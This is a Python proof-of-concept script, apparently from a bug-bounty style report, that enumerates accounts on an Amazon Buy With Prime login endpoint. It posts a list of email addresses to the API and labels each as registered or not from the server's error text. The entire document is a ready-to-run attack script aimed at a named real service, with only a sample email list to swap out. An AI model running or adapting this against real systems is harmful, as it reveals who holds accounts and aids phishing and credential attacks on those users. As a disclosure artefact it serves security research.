import requests
import time

# Target Configuration
# NOTE: Replace URL with the specific endpoint identified in the report
URL = "https://console.buywithprime.amazon.com/api/login_endpoint" 
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/json"
}

# Sample datasets for demonstration purposes
emails_to_test = [
    "admin@example.com",
    "contact@merchant-target.com",
    "verify-test@gmail.com",
    "non-existent-account-test@domain.com"
]

def check_email(email):
    payload = {"email": email}
    
    try:
        response = requests.post(URL, json=payload, headers=HEADERS, timeout=10)
        
        # Analyze response patterns to differentiate account existence
        # Adjust the string below based on the actual observed server response
        if "User not found" in response.text:
            return f"[-] {email} : NOT REGISTERED"
        else:
            return f"[+] {email} : REGISTERED / ACCOUNT EXISTS"
            
    except Exception as e:
        return f"[!] Connection Error on {email}: {str(e)}"

def main():
    print("-" * 45)
    print("Amazon Buy With Prime - Account Enumeration PoC")
    print("Research by: bridarynz")
    print("-" * 45)
    
    for email in emails_to_test:
        result = check_email(email)
        print(result)
        # Rate limiting simulation delay
        time.sleep(1)

if __name__ == "__main__":
    main()
  
